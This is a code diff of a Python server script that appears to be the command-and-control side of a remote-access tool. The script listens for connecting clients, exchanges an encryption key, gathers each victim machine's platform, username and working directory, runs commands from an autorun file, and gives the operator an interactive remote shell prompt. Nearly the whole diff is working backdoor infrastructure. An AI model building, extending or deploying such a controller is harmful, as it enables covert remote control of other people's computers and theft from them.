@@ -1,85 +1,103 @@
-import socket, threading, os
+from random import choice
+import socket, os, threading, json
 from cryptography.fernet import Fernet
 
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890!@#$%^&*()"
 
-port = 5567
-max_clients = 200
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-s.bind(("0.0.0.0", port))
-
-s.listen(max_clients)
-
-print("LISTENING ON 0.0.0.0:" + str(port))
-
+#read the key or generate
 key = b""
 if os.path.exists("client.key"):
-    print("Found key, reading bytes")
     with open("client.key", "rb") as f:
         key = f.read()
 else:
-    print("No key found, generating...")
-    key = Fernet.generate_key()
     with open("client.key", "wb") as f:
+        key = Fernet.generate_key()
         f.write(key)
 
-#make a thread for the client
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+port = 34467
+host = "0.0.0.0"
+
+s.bind((host, port))
+print(f"LISTENING ON {host}:{port}")
+
+s.listen(100)
+
+def new_salt():
+    salt = ""
+    for x in range(15):
+        salt += choice(chars)
+    return salt
+
 def handle_client(conn, addr):
-    print("Connected to: " + str(addr[0]))
-    conn.send(b"{SERVER KEY}")
-    conn.send(key)
-    #check for auto execute command
-    if os.path.exists("autoexecute.command"):
-        #send the commands
-        with open("autoexecute.command", "r") as f:
-            for line in f.readlines():
-                conn.send(b"{COMMAND}")
-                conn.send(Fernet(key).encrypt(line.encode()))
-                data = b""
-                while True:
-                    data = conn.recv(1024)
-                    if data: break
-                output = Fernet(key).decrypt(data)
-                print(output.decode())
-    #handle client requests
-    while True:
-        cmd = input(">>>").encode()
-        if cmd.decode() == "abort":
-            conn.send(b"{ABORT}")
-            conn.close()
-            print("SAFE")
-            break
-        elif cmd == b"send_file":
-            file_path = input("File path: ")
-            client_path = input("Path for client (full): ")
-            file_size = os.path.getsize(file_path)
-            seperator = "<SEPERATOR>"
-            conn.send(b"{FILE}")
-            head = file_path + seperator + str(file_size) + seperator + client_path
-            conn.send(head.encode())
-            with open(file_path, "rb") as f:
-                while True:
-                    bytes_read = f.read(1024 if file_size > 1024 else file_size)
-                    if not bytes_read: break
-                    conn.sendall(bytes_read)
-                print("SENT")
-                conn.send(b"{END OF FILE}")
-                continue
-        elif cmd == b"help":
-            print("""Help
-            send_file: will run you through a server to client file transfer wizard
-            abort: safty kill switch, instantly kill the current client
-            help: display this message""")
-            continue
-        conn.send(b"{COMMAND}")
-        conn.send(Fernet(key).encrypt(cmd))
+    encryption = False
+    def send_raw(content_type, Bytes_, salt=new_salt()):
+        seperator = "<|SEPERATE|>"
+        to_send = content_type + seperator + Bytes_.decode() + seperator + salt
+        to_send = to_send.encode()
+        if encryption:
+            to_send = Fernet(key).encrypt(to_send)
+        conn.send(to_send)
+    
+    def recv_raw(BufferSize):
+        seperator = "<|SEPERATE|>".encode()
         data = b""
         while True:
-            data = conn.recv(1024)
+            data = conn.recv(BufferSize)
             if data: break
-        output = Fernet(key).decrypt(data)
-        print(output.decode())
+        if encryption:
+            data = Fernet(key).decrypt(data)
+        splitted = data.decode().split(seperator.decode())
+        content_type = splitted[0]
+        Bytes_ = splitted[1].encode()
+        salt = splitted[2]
+        return {"content_type": content_type, "bytes": Bytes_}
+
+    print("NEW CLIENT AT IP: " + str(addr[0]))
+    print("EXTANGING KEY")
+    send_raw("KEY", key)
+    client_key = recv_raw(1024)["bytes"]
+    if key == client_key:
+        print("KEY EXTANGE VERIFIED")
+    else:
+        print("UNABLE TO VERIFY, CLIENT MAY EXPERIENCE ISSUES")
+        print(key)
+        print(client_key)
+    encryption = True
+
+    print("GRAPPING SYSTEM INFO...")
+    sys_info_request = recv_raw(1024)
+    print("RECIVED, DECODING...")
+    sys_info = json.loads(sys_info_request["bytes"].decode())
+    print("BASIC INFO:")
+    print("Platoform: " + sys_info["platform"])
+    print("Architecture: " + str(sys_info["architecture"]))
+    print("Username: " + sys_info["username"])
+    
+    if os.path.exists("autorun.txt"):
+        with open("autorun.txt", "r") as f:
+            print("FOUND AUTORUN, EXECUTING COMMANDS")
+            for line in f.readlines():
+                print("> " + line)
+                send_raw("command", line.encode())
+                output = recv_raw(1024)
+                print(output["bytes"].decode())
+
+    current_dir = sys_info["current_dir"]
+    while True:
+        try:
+            cmd = input(current_dir + "> " + sys_info["username"] + " $ ")
+            if cmd == "abort":
+                send_raw("abort", "".encode())
+                conn.close()
+                print("SAFE")
+                break
+            send_raw("command", cmd.encode())
+            output = recv_raw(1024)["bytes"].decode()
+            print(output)
+        except:
+            print("UNEXCPECTED ERROR")
 
 while True:
     conn, addr = s.accept()
